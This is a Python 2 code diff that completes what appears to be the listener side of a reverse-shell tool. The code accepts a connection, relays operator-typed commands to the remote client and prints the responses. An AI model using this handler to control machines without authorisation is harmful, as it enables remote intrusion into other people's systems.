@@ -14,6 +14,7 @@ def socket_create():
     except socket.error as e:
         print 'Error creating socket: ' + str(e)
 
+
 def socket_bind():
     try:
         global host
@@ -28,3 +29,34 @@ def socket_bind():
         print 'Binding socket error: ' + str(e)
         print 'Retrying..'
         socket_bind()
+
+
+def socket_accept():
+    conn, address = s.accept()
+    print 'Connection created: ' + address[0] + ' : ' + str(address[1])
+    send_commands(conn)
+    conn.close()
+
+
+def send_commands(conn):
+    while True:
+        cmd = input()
+
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024))
+            print client_response
+
+
+def main():
+    socket_create()
+    socket_bind()
+    socket_accept()
+
+
+main()
